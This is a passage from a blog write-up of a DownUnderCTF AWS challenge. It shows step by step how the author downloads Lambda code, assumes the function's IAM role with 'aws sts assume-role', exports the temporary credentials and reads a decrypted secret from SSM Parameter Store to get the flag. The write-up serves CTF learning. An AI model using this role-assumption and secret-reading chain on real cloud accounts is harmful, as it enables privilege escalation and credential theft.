      the “Mary had a little lambda” challenge
   3. EExxeeccuuttiioonn RRoollee: The function runs under arn:aws:iam::487266254163:role/
      lambda_role - this role would have specific permissions that might be
      exploitable
SStteepp 33:: DDoowwnnllooaadd aanndd AAnnaallyyzzee LLaammbbddaa CCooddee
Using the S3 URL from the previous response, I downloaded the Lambda function
code. The ZIP file contained a Python file with the following source code:
1  import os
2  import json
3  import logging
4  import boto3
5  import mysql.connector
6
7  logger = logging.getLogger()
8  logger.setLevel(logging.INFO)
9
10 def lambda_handler(event, context):
11     session = boto3.Session()
12     ssm = session.client('ssm')
13     dbpass = ssm.get_parameter(Name="/production/database/password",
14 WithDecryption=True)['Parameter']['Value']
15     mydb = mysql.connector.connect(
16        host="10.10.1.1",
17        user="dbuser",
18        password=dbpass,
19        database="BovineDb"
20     )
21     cursor = mydb.cursor()
22     cursor.execute("SELECT * FROM bovines")
23     results = cursor.fetchall()
24
25     # For testing without the DB!
26     #results = [(1, 'Yak', 'Hairy', False),(2, 'Bison', 'Large', True)]
27     numresults = len(results)
28     response = f"Database contains {numresults} bovines."
29     logger.info(response)
30     return {
31         'statusCode' : 200,
32         'body': response
       }
CCrriittiiccaall DDiissccoovveerryy: The code revealed that the Lambda function retrieves a
database password from AWS Systems Manager Parameter Store at the path /
production/database/password using the ssm.get_parameter() call with
WithDecryption=True. This was the key insight - the flag was likely stored in
this SSM parameter!
However, there was a problem: my current devopsadmin credentials didn’t have
permission to access SSM parameters directly. I needed to assume the Lambda’s
execution role to gain the same permissions the function uses.
SStteepp 44:: AAssssuummee LLaammbbddaa RRoollee
The Lambda function runs under the lambda_role IAM role, which has the
necessary permissions to read from SSM Parameter Store. I used AWS STS
(Security Token Service) to assume this role:
1 aws sts assume-role \
2   --role-arn arn:aws:iam::487266254163:role/lambda_role \
3   --role-session-name temp-session \
4   --profile mary > creds.json
This command successfully assumed the Lambda’s role and saved the temporary
credentials to creds.json. The fact that this worked indicated that the
devopsadmin user had sts:AssumeRole permissions for the Lambda role - a common
but potentially dangerous permission configuration.
SStteepp 55:: CCoonnffiigguurree TTeemmppoorraarryy CCrreeddeennttiiaallss
I extracted the temporary credentials from the JSON response and configured
them as environment variables to use with the AWS CLI:
1 export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' creds.json)
2 export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey'
3 creds.json)
4 export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' creds.json)
  export AWS_DEFAULT_REGION=us-east-1
Now I was operating with the same permissions as the Lambda function itself.
SStteepp 66:: RReettrriieevvee tthhee FFllaagg
With the Lambda role credentials, I could now access the Systems Manager
Parameter Store and retrieve the database password that the Lambda function
uses:
1 aws ssm get-parameter --name "/production/database/password" --with-
  decryption
RReessppoonnssee::
1  {
2      "Parameter": {
3          "Name": "/production/database/password",
4          "Type": "SecureString",
5          "Value": "DUCTF{.*#--BosMutusOfTheTibetanPlateau--#*.}",
6          "Version": 1,
7          "LastModifiedDate": "2025-07-14T08:42:32.390000-04:00",
8          "ARN": "arn:aws:ssm:us-east-1:487266254163:parameter/production/
9  database/password",
10         "DataType": "text"
11     }
   }
SSuucccceessss!! The response revealed that the “database password” was actually the
challenge flag. The parameter was stored as a SecureString type (encrypted) and
contained the flag: DUCTF{.*#--BosMutusOfTheTibetanPlateau--#*.}.
The flag name is a clever reference to BBooss mmuuttuuss (wild yak), which is native to
the Tibetan Plateau - perfectly fitting the Ministry of Australian Research
into Yaks (MARY) theme.
FFllaagg:: DUCTF{.*#--BosMutusOfTheTibetanPlateau--#*.}
_[_a_w_s_]
===============================================================================
CCoonncclluussiioonn
DownUnderCTF 6 provided excellent challenges across all categories, offering
great learning opportunities from basic web exploitation to advanced AI and
reverse engineering problems. The competition highlighted the importance of
having a diverse toolkit and adapting quickly to different challenge types.
Special thanks to the DownUnderCTF organizers for putting together such a well-
crafted competition!
Stay tuned for more CTF writeups and happy hacking! 🚀
===============================================================================
DDiissccllaaiimmeerr:: TThhiiss wwrriitteeuupp iiss ffoorr eedduuccaattiioonnaall ppuurrppoosseess oonnllyy.. AAllwwaayyss eennssuurree yyoouu
hhaavvee pprrooppeerr aauutthhoorriizzaattiioonn bbeeffoorree tteessttiinngg oonn aannyy ssyysstteemmss.. AAllll tteecchhnniiqquueess
ddeessccrriibbeedd sshhoouulldd oonnllyy bbee uusseedd iinn lleeggaall,, eetthhiiccaall ccoonntteexxttss ssuucchh aass aauutthhoorriizzeedd
ppeenneettrraattiioonn tteessttiinngg oorr CCTTFF ccoommppeettiittiioonnss..
_C_T_F, _D_o_w_n_U_n_d_e_r_C_T_F
_d_o_w_n_u_n_d_e_r_c_t_f _w_e_b _p_w_n _c_r_y_p_t_o _r_e_v _a_i _o_s_i_n_t _m_i_s_c _c_t_f _w_r_i_t_e_u_p
This post is licensed under _C_C_ _B_Y_ _4_._0_ by the author.
Share
********** RReecceennttllyy UUppddaatteedd **********
    * _D_o_w_n_U_n_d_e_r_C_T_F_ _6_ _C_o_m_p_l_e_t_e_ _W_r_i_t_e_u_p_ _-_ _A_l_l_ _C_a_t_e_g_o_r_i_e_s
    * _F_i_l_e_ _D_e_s_c_r_i_p_t_o_r_ _L_e_a_k_ _v_i_a_ _/_d_e_v_/_f_d_ _-_ _A_ _L_i_n_u_x_ _P_r_i_v_i_l_e_g_e_ _E_s_c_a_l_a_t_i_o_n_ _T_e_c_h_n_i_q_u_e
********** TTrreennddiinngg TTaaggss **********
_/_d_e_v_/_f_d _a_i _c_r_y_p_t_o _c_t_f _d_o_w_n_u_n_d_e_r_c_t_f _f_i_l_e_-_d_e_s_c_r_i_p_t_o_r_s _l_i_n_u_x _m_i_s_c _o_s_i_n_t _p_e_n_t_e_s_t
********** CCoonntteennttss **********
_F_i_l_e_ _D_e_s_c_r_i_p_t_o_r_ _L_e_a_k_ _v_i_a_ _/_d_e_v_/_f_d_ _-_ _A_ _L_i_n_u_x_ _P_r_i_v_i_l_e_g_e_ _E_s_c_a_l_a_t_i_o_n_ _T_e_c_h_n_i_q_u_e
-
© 2025 _K_4_Y_R_0. Some rights reserved.
Using the _C_h_i_r_p_y theme for _J_e_k_y_l_l.
********** TTrreennddiinngg TTaaggss **********
_/_d_e_v_/_f_d _a_i _c_r_y_p_t_o _c_t_f _d_o_w_n_u_n_d_e_r_c_t_f _f_i_l_e_-_d_e_s_c_r_i_p_t_o_r_s _l_i_n_u_x _m_i_s_c _o_s_i_n_t _p_e_n_t_e_s_t
A new version of content is available.
Update
